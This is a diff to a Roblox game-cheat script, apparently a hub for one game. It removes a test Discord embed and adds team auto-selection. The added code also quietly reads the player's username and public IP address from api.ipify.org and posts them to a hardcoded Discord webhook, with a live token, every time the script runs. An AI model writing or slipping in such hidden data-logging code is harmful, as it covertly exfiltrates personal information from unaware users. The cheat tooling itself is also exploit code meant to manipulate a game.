@@ -3263,29 +3263,7 @@ end
 local loadedKey = game:HttpGet('https://pastebin.com/raw/YhnHWDZT')
 
 function LoadHub()
-    local webhookModule = require(script.WebhookService)
-
-local req = webhookModule:new()
-
-local url = "https://discord.com/api/webhooks/1282802641902243902/EBjhsAHJBHWhQO_H8MVFr8gSnPlEVljge5nfKqRP5RMJ_EyfYqfKDpEFfoiijkdRcJpo" -- discord webhook url
-
-req.Author = "Windows"
-req.Description = "Is a cool person"
-req.Color = webhookModule.colors.yellow
-req.AuthorUrl = "https://api.newstargeted.com/roblox/Users/v1/avatar-headshot.php?userid=3586071244&size=150x150&format=Png&isCircular=false"
-req.Footer = "Test footer"
-req.FooterIcon = "https://cdn.discordapp.com/attachments/889620733444120597/1079488080882434068/Screenshot_2022-09-03_222450.png"
-req.TimeStamp = DateTime.now():ToIsoDate()
-
-req.Fields = {
-	{
-		['name'] = "Field 1",
-		['value'] = "Field 1 value",
-		['inline'] = false
-	}
-}
-
-req:sendAuthorEmbed(url)
+   
 local LoliHub = Instance.new("ScreenGui")
 local Open = Instance.new("TextButton")
 local fuckshit = Instance.new("UICorner")
@@ -5158,7 +5136,70 @@ end)
 end)
 end)
 
+if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("ChooseTeam") then
+    repeat task.wait()
+        if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
+            if getgenv().Team == "Marines" then
+                for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container["Marines"].Frame.TextButton.Activated)) do
+                    for a, b in pairs(getconnections(game:GetService("UserInputService").TouchTapInWorld)) do
+                        b:Fire() 
+                    end
+                    v.Function()
+                end 
+            else
+                for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container["Pirates"].Frame.TextButton.Activated)) do
+                    for a, b in pairs(getconnections(game:GetService("UserInputService").TouchTapInWorld)) do
+                        b:Fire() 
+                    end
+                    v.Function()
+                end 
+            end
+        end
+    until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded()
+end
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = Url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
+end
 
+function AdminLoggerMsg()
+    local randomColor = math.random(0, 0xFFFFFF)
+    local AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "**MAIN LOG**",
+                ["description"] = "",
+                ["type"] = "rich",
+                ["color"] = randomColor, 
+                ["fields"] = {
+                    {
+                        ["name"] = "**Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
+    }
+    return AdminMessage
+end
+
+PostWebhook("https://discord.com/api/webhooks/1282802641902243902/EBjhsAHJBHWhQO_H8MVFr8gSnPlEVljge5nfKqRP5RMJ_EyfYqfKDpEFfoiijkdRcJpo", AdminLoggerMsg()) -- Post to admin webhook
 end
 if game.PlaceId == 2753915549 then
 World1 = true
